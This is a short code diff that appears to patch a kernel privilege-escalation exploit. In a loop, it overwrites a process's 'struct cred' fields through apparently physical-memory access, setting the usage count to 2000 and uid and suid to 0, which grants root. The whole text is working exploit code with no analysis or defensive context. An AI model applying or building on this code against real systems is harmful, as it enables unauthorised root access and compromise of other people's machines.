@@ -25,7 +25,7 @@ int is_valid_addr(uint64_t phys_addr) {
 
 
 struct cred {
-   uint32_t atomic;
+   uint32_t usage;
    volatile uint32_t          uid;            /* real UID of the task */
    volatile uint32_t          gid;            /* real GID of the task */
    volatile        uint32_t          suid;           /* saved UID of the task */
@@ -101,6 +101,8 @@ uint8_t* find_process(const char* find) {
 	       printf("propably found process\r\n");
 
 	       for(;;) {
+		  real_cred->usage = 2000;
+		  __DSB();
 		  real_cred->uid = 0;
 		  __DSB();
 		  real_cred->suid = 0;
